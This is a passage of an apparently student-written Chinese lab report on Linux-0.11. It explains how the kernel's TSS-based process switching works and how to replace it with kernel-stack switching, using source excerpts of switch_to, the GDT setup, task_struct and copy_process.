<li>将 Linux-0.11 中采用的基于 TSS 进程切换去掉，取而代之的是基于堆栈的切换程序，具体地说，也就是将进程切换函数 <code>schedule()</code> 函数中的 <code>switch_to()</code> 函数从原本的基于 TSS 切换改写成基于堆栈的切换</li>
<li>编写汇编程序 <code>switch_to()</code>，完成主体框架，在主体框架下依次完成 PCB 切换、内核栈切换、LDT 切换等</li>
<li>修改 <code>fork()</code>，由于是基于内核栈的切换，所以进程需要创建出能完成切换的内核栈</li>
<li>修改 PCB，即 task_struct 结构，增加相应的内容域，同时处理由于修改了 task_struct 所造成的影响</li>
</ul>
<p><strong>实验过程</strong></p>
<p>TSS（Task State Segment）即任务状态段：</p>
<ul>
<li>在 x86 架构下，每个进程/线程都有自己的 TSS，用于存储进程的状态信息</li>
<li>TSS 中存储了进程切换所需的寄存器和栈信息，使得进程在切换时能够快速地恢复现场并继续执行 </li>
</ul>
<p>TSS0 是 Linux-0.11 中的一个特殊段，用于保存内核进程的状态，在保护模式下，操作系统可以使用 TSS0 来保存当前内核进程的栈地址等信息，以便在需要时切换到其他内核进程</p>
<p>在 linux-0.11 中，表示 TSS 的结构体如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">long</span>	back_link;	<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	esp0;</span><br><span class="line">	<span class="keyword">long</span>	ss0;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	esp1;</span><br><span class="line">	<span class="keyword">long</span>	ss1;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	esp2;</span><br><span class="line">	<span class="keyword">long</span>	ss2;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	cr3;</span><br><span class="line">	<span class="keyword">long</span>	eip;</span><br><span class="line">	<span class="keyword">long</span>	eflags;</span><br><span class="line">	<span class="keyword">long</span>	eax,ecx,edx,ebx;</span><br><span class="line">	<span class="keyword">long</span>	esp;</span><br><span class="line">	<span class="keyword">long</span>	ebp;</span><br><span class="line">	<span class="keyword">long</span>	esi;</span><br><span class="line">	<span class="keyword">long</span>	edi;</span><br><span class="line">	<span class="keyword">long</span>	es;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	cs;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	ss;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	ds;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	fs;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	gs;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	ldt;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	trace_bitmap;	<span class="comment">/* bits: trace 0, bitmap 16-31 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">i387_struct</span> <span class="title">i387</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>tss_struct</code> 也会被记录在 <code>task_struct</code> 中：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    ......</span><br><span class="line"><span class="comment">/* tss for this task */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> <span class="title">tss</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>GDT（Global Descriptor Table）是 x86 处理器中的一个全局数据表，用于描述进程的内存空间：</p>
<ul>
<li>在 linux-0.11 中的 GDT 条目只有两个成员：<ul>
<li>TSS：任务状态段</li>
<li>LDT：局部描述符表，用于描述一个进程的内存布局（以权限划分的各个段）</li>
</ul>
</li>
</ul>
<p>接下来我们可以分析一下 GDT 的生成过程：</p>
<ul>
<li>系统加电时，最先启动的程序就是 BIOS，负责将操作系统从硬盘加载到内存中</li>
<li>之后系统执行 bootloader，其源码如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">entry start</span><br><span class="line">start:</span><br><span class="line"></span><br><span class="line">! ok, the read went well so we get current cursor position and save it for</span><br><span class="line">! posterity.</span><br><span class="line"></span><br><span class="line">	mov	ax,#INITSEG	! this is done in bootsect already, but...</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	mov	ah,#0x03	! read cursor pos</span><br><span class="line">	xor	bh,bh</span><br><span class="line">	int	0x10		! save it in known place, con_init fetches</span><br><span class="line">	mov	[0],dx		! it from 0x90000.</span><br><span class="line">	</span><br><span class="line">	......</span><br><span class="line">	</span><br><span class="line">end_move:</span><br><span class="line">	mov	ax,#SETUPSEG	! right, forgot this at first. didn&#x27;t work :-)</span><br><span class="line">	mov	ds,ax</span><br><span class="line">	lidt	idt_48		! load idt with 0,0</span><br><span class="line">	lgdt	gdt_48		! load gdt with whatever appropriate</span><br></pre></td></tr></table></figure>
<ul>
<li>这段代码的前半部分在 Lab1 中已经分析过了，我们只需要看最后两段代码：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lidt	idt_48		! load idt with 0,0</span><br><span class="line">lgdt	gdt_48		! load gdt with whatever appropriate</span><br></pre></td></tr></table></figure>
<ul>
<li><code>lidt</code> 用于加载中断描述符段表 IDT </li>
<li><code>lgdt</code> 用于加载全局描述符段表 GDT</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">gdt:</span><br><span class="line">	.word	0,0,0,0		! dummy</span><br><span class="line"></span><br><span class="line">	.word	0x07FF		! 8Mb - limit=2047 (2048*4096=8Mb)</span><br><span class="line">	.word	0x0000		! base address=0</span><br><span class="line">	.word	0x9A00		! code read/exec</span><br><span class="line">	.word	0x00C0		! granularity=4096, 386</span><br><span class="line"></span><br><span class="line">	.word	0x07FF		! 8Mb - limit=2047 (2048*4096=8Mb)</span><br><span class="line">	.word	0x0000		! base address=0</span><br><span class="line">	.word	0x9200		! data read/write</span><br><span class="line">	.word	0x00C0		! granularity=4096, 386</span><br><span class="line">        </span><br><span class="line">idt_48:</span><br><span class="line">	.word	0			! idt limit=0</span><br><span class="line">	.word	0,0			! idt base=0L</span><br><span class="line"></span><br><span class="line">gdt_48:</span><br><span class="line">	.word	0x800		! gdt limit=2048, 256 GDT entries</span><br><span class="line">	.word	512+gdt,0x9	! gdt base = 0X9xxxx</span><br></pre></td></tr></table></figure>
<ul>
<li>这里 bootloader 只做了最低程度的 GDT/IDT 初始化（为了 bootloader 的其他模块可以正常运行），后续的核心操作在 head.s 中</li>
<li>而 head.s 文件通常会在引导程序执行的最后一个阶段被调用，其源码如下：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text</span><br><span class="line">.globl idt,gdt,pg_dir,tmp_floppy_area</span><br><span class="line">pg_dir:</span><br><span class="line">.globl startup_32</span><br><span class="line">startup_32:</span><br><span class="line">	movl $0x10,%eax</span><br><span class="line">	mov %ax,%ds</span><br><span class="line">	mov %ax,%es</span><br><span class="line">	mov %ax,%fs</span><br><span class="line">	mov %ax,%gs</span><br><span class="line">	lss stack_start,%esp /* 将栈指针%esp的值设置为stack_start */</span><br><span class="line">	call setup_idt /* 设置中断描述符段表 */</span><br><span class="line">	call setup_gdt /* 设置全局描述符段表 */</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">setup_gdt:</span><br><span class="line">	lgdt gdt_descr</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">setup_idt:</span><br><span class="line">	lea ignore_int,%edx</span><br><span class="line">	movl $0x00080000,%eax</span><br><span class="line">	movw %dx,%ax		/* selector = 0x0008 = cs */</span><br><span class="line">	movw $0x8E00,%dx	/* interrupt gate - dpl=0, present */</span><br><span class="line"></span><br><span class="line">	lea idt,%edi</span><br><span class="line">	mov $256,%ecx</span><br><span class="line">rp_sidt:</span><br><span class="line">	movl %eax,(%edi)</span><br><span class="line">	movl %edx,4(%edi)</span><br><span class="line">	addl $8,%edi</span><br><span class="line">	dec %ecx</span><br><span class="line">	jne rp_sidt</span><br><span class="line">	lidt idt_descr</span><br><span class="line">	ret</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.align 2</span><br><span class="line">.word 0</span><br><span class="line">idt_descr:/* 前(低)16位是IDT的界限值,后(高)32位是IDT的基地址 */</span><br><span class="line">	.word 256*8-1		# idt contains 256 entries</span><br><span class="line">	.long idt</span><br><span class="line">.align 2</span><br><span class="line">.word 0</span><br><span class="line">gdt_descr: /* 前(低)16位是GDT的界限值,后(高)32位是GDT的基地址 */</span><br><span class="line">	.word 256*8-1		# so does gdt (not that that&#x27;s any</span><br><span class="line">	.long gdt		# magic number, but it works for me :^)</span><br><span class="line"></span><br><span class="line">	.align 8</span><br><span class="line">idt:	.fill 256,8,0		# idt is uninitialized</span><br><span class="line"></span><br><span class="line">gdt:	.quad 0x0000000000000000	/* NULL descriptor */</span><br><span class="line">	.quad 0x00c09a0000000fff	/* 16Mb */</span><br><span class="line">	.quad 0x00c0920000000fff	/* 16Mb */</span><br><span class="line">	.quad 0x0000000000000000	/* TEMPORARY - don&#x27;t use */</span><br><span class="line">	.fill 252,8,0			/* space for LDT&#x27;s and TSS&#x27;s etc */</span><br></pre></td></tr></table></figure>
<ul>
<li>函数 <code>setup_idt/setup_gdt</code> 会分别创建 IDT/GDT 的内存结构，在后续的初始化中会往其中添加条目</li>
<li>源码中没有设置具体的 GDT/IDT 基地址，而是在编译时由编译器计算获取</li>
</ul>
<p>下面先分析 TSS 进程切换的过程，在 linux-0.11 中 <code>switch_to</code> 的源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> switch_to(n) &#123;\ </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="keyword">long</span> a,b;&#125; __tmp; \</span><br><span class="line">__asm__(<span class="string">&quot;cmpl %%ecx,current\n\t&quot;</span> \ <span class="comment">/* 比较task[n]和current */</span></span><br><span class="line">	<span class="string">&quot;je 1f\n\t&quot;</span> \</span><br><span class="line">	<span class="string">&quot;movw %%dx,%1\n\t&quot;</span> \ <span class="comment">/* 将TSS选择符存放入tmp.b(tmp.a中的偏移为默认值-&quot;0&quot;) */</span></span><br><span class="line">	<span class="string">&quot;xchgl %%ecx,current\n\t&quot;</span> \ <span class="comment">/* 交换current和task[n]的指针 */</span></span><br><span class="line">	<span class="string">&quot;ljmp *%0\n\t&quot;</span> \ <span class="comment">/* 跳转到目标进程 */</span></span><br><span class="line">	<span class="string">&quot;cmpl %%ecx,last_task_used_math\n\t&quot;</span> \ <span class="comment">/* 比较task[n]和last_task_used_math */</span></span><br><span class="line">	<span class="string">&quot;jne 1f\n\t&quot;</span> \</span><br><span class="line">	<span class="string">&quot;clts\n&quot;</span> \ <span class="comment">/* 清除时间戳计数器(TSC)寄存器中的计数值 */</span></span><br><span class="line">	<span class="string">&quot;1:&quot;</span> \</span><br><span class="line">	::<span class="string">&quot;m&quot;</span> (*&amp;__tmp.a),<span class="string">&quot;m&quot;</span> (*&amp;__tmp.b), \ </span><br><span class="line">	<span class="string">&quot;d&quot;</span> (_TSS(n)),<span class="string">&quot;c&quot;</span> ((<span class="keyword">long</span>) task[n])); \ <span class="comment">/* edx存放任务号为n的TSS选择符,ecx存放task[n] */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>__asm__</code> 语法中，<code>::</code> 后面跟着的字母序列表示汇编指令的类别：<ul>
<li><code>m</code>：类型为内存（不需要借助寄存器）</li>
<li><code>r</code>：类型为寄存器</li>
<li><code>d</code>：类型为 <code>edx</code> 寄存器</li>
<li><code>c</code>：类型为 <code>ecx</code> 寄存器</li>
</ul>
</li>
<li><code>current</code> 指向当前进程的 <code>task_struct</code> 结构体</li>
<li><code>last_task_used_math</code> 存储上一次使用 math 模式的任务的 <code>task_struct</code> 结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_TSS_ENTRY 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FIRST_LDT_ENTRY (FIRST_TSS_ENTRY+1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TSS(n) ((((unsigned long) n)&lt;&lt;4)+(FIRST_TSS_ENTRY&lt;&lt;3))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _LDT(n) ((((unsigned long) n)&lt;&lt;4)+(FIRST_LDT_ENTRY&lt;&lt;3))</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>FIRST_TSS_ENTRY&lt;&lt;3(32)</code> 为 TSS 的基地址</li>
<li><code>FIRST_LDT_ENTRY&lt;&lt;3(40)</code> 为 LDT 的基地址</li>
<li>通过宏函数 <code>_TSS(n)</code> 和 <code>_LDT(n)</code> 就可以计算出目标 TSS / LDT 在 GDT 中的地址</li>
</ul>
<p>函数 <code>switch_to</code> 除了完成 current 的相关操作以外，最核心的指令就是 <code>ljmp *%0</code>：</p>
<ul>
<li>指令 <code>ljmp</code> 有两个参数：TSS 段选择符，偏移地址<ul>
<li>结构体 <code>__tmp</code> 就是为了保存这两个参数</li>
<li>在 <code>tmp.a</code> 中保存偏移（默认值为 “0”），在 <code>tmp.b</code> 中保存目标的 TSS 选择符</li>
</ul>
</li>
<li>指令 <code>ljmp</code> 执行后，系统就会读取目标 <code>tss_struct</code> 结构体中的进程信息，然后实现进程跳转<ul>
<li>详细的操作步骤由 x86 架构的硬件负责</li>
</ul>
</li>
</ul>
<p>接下来阐述一下基于堆栈的进程切换过程：</p>
<ul>
<li>当系统发生中断从用户态进入内核态时，CPU 通过 <code>_TSS(n)</code> 寄存器找到 TSS 的位置，根据 TSS 中保存的 ss0:esp0 的值切换到内核栈，然后将用户栈的 ss,esp,eflags,cs,eip 的值保存在内核栈中</li>
<li>中断处理完成后，此时若调度函数找到了需要切换的进程，此时就该将进程的其他寄存器信息也保存至内核栈中，然后切换到目的进程的 PCB、内核栈、LDT</li>
<li>最后从目的进程的内核栈中恢复寄存器的值，并从中断返回，此时 iret 将弹出目的进程的 cs:eip，从而能跳转到目的进程中继续执行，这样就完成了进程的切换</li>
</ul>
<p>下面是 linux-0.11 管理内核栈的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">task_union</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> <span class="title">task</span>;</span></span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">stack</span>[PAGE_SIZE];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>Linux-0.11 将进程的 task_struct（PCB）和内核栈定义在了一起（联合体）</li>
<li>PS：其实这里我有一些疑问，将两者放在一起会不会产生安全问题</li>
</ul>
<p>在 <code>copy_process</code> 中，内核为 task_struct 分配了 4KB 的空间：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = (struct task_struct *) get_free_page();</span><br></pre></td></tr></table></figure>
<ul>
<li>task_struct 的大小没有 4KB，因此剩下的空间就属于内核栈</li>
<li>PS：由于栈是向上增长的，而 task_struct 在页内存的低地址，一般不会发生冲突（如何内核栈使用过大，也可能会覆盖 task_struct）</li>
</ul>
<p>内核设置 tss_struct-&gt;esp0（内核栈地址）的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;tss.esp0 = PAGE_SIZE + (<span class="keyword">long</span>) p;</span><br></pre></td></tr></table></figure>
<ul>
<li>PCB 位于这页内存的低地址，内核栈位于这页内存的高地址</li>
</ul>
<p>由于当前内核版本的内核栈顶地址记录在 tss_struct 中，如果不使用 TSS 机制则需要在 task_struct 中添加新的条目以记录内核栈顶地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* these are hardcoded - don&#x27;t touch */</span></span><br><span class="line">	<span class="keyword">long</span> state;	<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">	<span class="keyword">long</span> counter;</span><br><span class="line">	<span class="keyword">long</span> priority;</span><br><span class="line">	<span class="keyword">long</span> kernelstack; <span class="comment">/* 用于记录内核栈顶地址(相当于task_struct-&gt;tss.esp0) */</span></span><br><span class="line">	<span class="keyword">long</span> signal;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigaction</span>[32];</span></span><br><span class="line">	<span class="keyword">long</span> blocked;	<span class="comment">/* bitmap of masked signals */</span></span><br><span class="line">    ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>接下来有一处关于 task_struct 的硬编码和多次偏移地址需要修改：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_TASK \</span></span><br><span class="line"><span class="meta"><span class="comment">/* state etc */</span>	&#123; 0,15,15,PAGE_SIZE+(long)&amp;init_task, \</span></span><br><span class="line"><span class="meta"><span class="comment">/* signals */</span>	0,&#123;&#123;&#125;,&#125;,0, \</span></span><br><span class="line"><span class="meta">    ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>INIT_TASK</code> 用于生成 swapper 进程（pid = 0）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">state	= <span class="number">0</span>		<span class="meta"># these are offsets into the task-struct.</span></span><br><span class="line">counter	= <span class="number">4</span></span><br><span class="line">priority = <span class="number">8</span></span><br><span class="line">KERNEL_STACK = <span class="number">12</span></span><br><span class="line">signal	= <span class="number">12</span>+<span class="number">4</span></span><br><span class="line">sigaction = <span class="number">16</span>+<span class="number">4</span>		# MUST be <span class="number">16</span> (=len of sigaction)</span><br><span class="line">blocked = (<span class="number">32</span>*<span class="number">16</span>+<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>修改 <code>system_call.s</code> 中定义的偏移量（添加 KERNEL_STACK，后续的条目向后移4字节）</li>
</ul>
<p>当新进程被创建时，我们需要为其设置内核栈，具体操作可以参考如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_process</span><span class="params">(<span class="keyword">int</span> nr,<span class="keyword">long</span> ebp,<span class="keyword">long</span> edi,<span class="keyword">long</span> esi,<span class="keyword">long</span> gs,<span class="keyword">long</span> none,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">long</span> ebx,<span class="keyword">long</span> ecx,<span class="keyword">long</span> edx,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">long</span> fs,<span class="keyword">long</span> es,<span class="keyword">long</span> ds,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">long</span> eip,<span class="keyword">long</span> cs,<span class="keyword">long</span> eflags,<span class="keyword">long</span> esp,<span class="keyword">long</span> ss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"></span><br><span class="line">	p = (struct task_struct *) get_free_page();</span><br><span class="line">    ......</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 将新进程的TSS初始化去掉(我们只需要使用TSS0)</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	p-&gt;tss.back_link = 0;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.esp0 = PAGE_SIZE + (long) p;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.ss0 = 0x10;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.eip = eip;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.eflags = eflags;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.eax = 0;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.ecx = ecx;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.edx = edx;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.ebx = ebx;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.esp = esp;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.ebp = ebp;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.esi = esi;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.edi = edi;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.es = es &amp; 0xffff;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.cs = cs &amp; 0xffff;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.ss = ss &amp; 0xffff;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.ds = ds &amp; 0xffff;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.fs = fs &amp; 0xffff;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.gs = gs &amp; 0xffff;</span></span><br><span class="line"><span class="comment">	p-&gt;tss.ldt = _LDT(nr);</span></span><br><span class="line"><span class="comment">	p-&gt;tss.trace_bitmap = 0x80000000;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">long</span> * krnstack = (<span class="keyword">long</span> *)(PAGE_SIZE+(<span class="keyword">long</span>)p); <span class="comment">/* 设置内核栈顶 */</span></span><br><span class="line">	*(--krnstack) = ss &amp; <span class="number">0xffff</span>;</span><br><span class="line">	*(--krnstack) = esp;</span><br><span class="line">	*(--krnstack) = eflags;</span><br><span class="line">	*(--krnstack) = cs &amp; <span class="number">0xffff</span>;</span><br><span class="line">	*(--krnstack) = eip;</span><br><span class="line">	*(--krnstack) = ds &amp; <span class="number">0xffff</span>;</span><br><span class="line">	*(--krnstack) = es &amp; <span class="number">0xffff</span>;</span><br><span class="line">	*(--krnstack) = fs &amp; <span class="number">0xffff</span>;</span><br><span class="line">	*(--krnstack) = gs &amp; <span class="number">0xffff</span>;</span><br><span class="line">	*(--krnstack) = esi;</span><br><span class="line">	*(--krnstack) = edi;</span><br><span class="line">	*(--krnstack) = edx;</span><br><span class="line">	*(--krnstack) = (<span class="keyword">long</span>) first_return_kernel;</span><br><span class="line">	*(--krnstack) = ebp;</span><br><span class="line">	*(--krnstack) = ecx;</span><br><span class="line">	*(--krnstack) = ebx;</span><br><span class="line">	*(--krnstack) = <span class="number">0</span>; <span class="comment">/* eax(默认为&quot;0&quot;) */</span></span><br><span class="line">	p-&gt;kernelstack = krnstack;</span><br><span class="line">    ......</span><br><span class="line">	<span class="keyword">return</span> last_pid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了理解内核栈的排列，我们可以先看基于内核栈的 switch_to 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">switch_to</span><span class="params">(struct task_struct *pnext, <span class="keyword">unsigned</span> <span class="keyword">long</span> ldt)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>该函数需要两个参数：切换进程的 task_struct 结构体和 ldt 编号</li>
</ul>
<p>具体的实现如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> *<span class="title">tss</span> =</span> &amp;(init_task.task.tss);</span><br></pre></td></tr></table></figure>
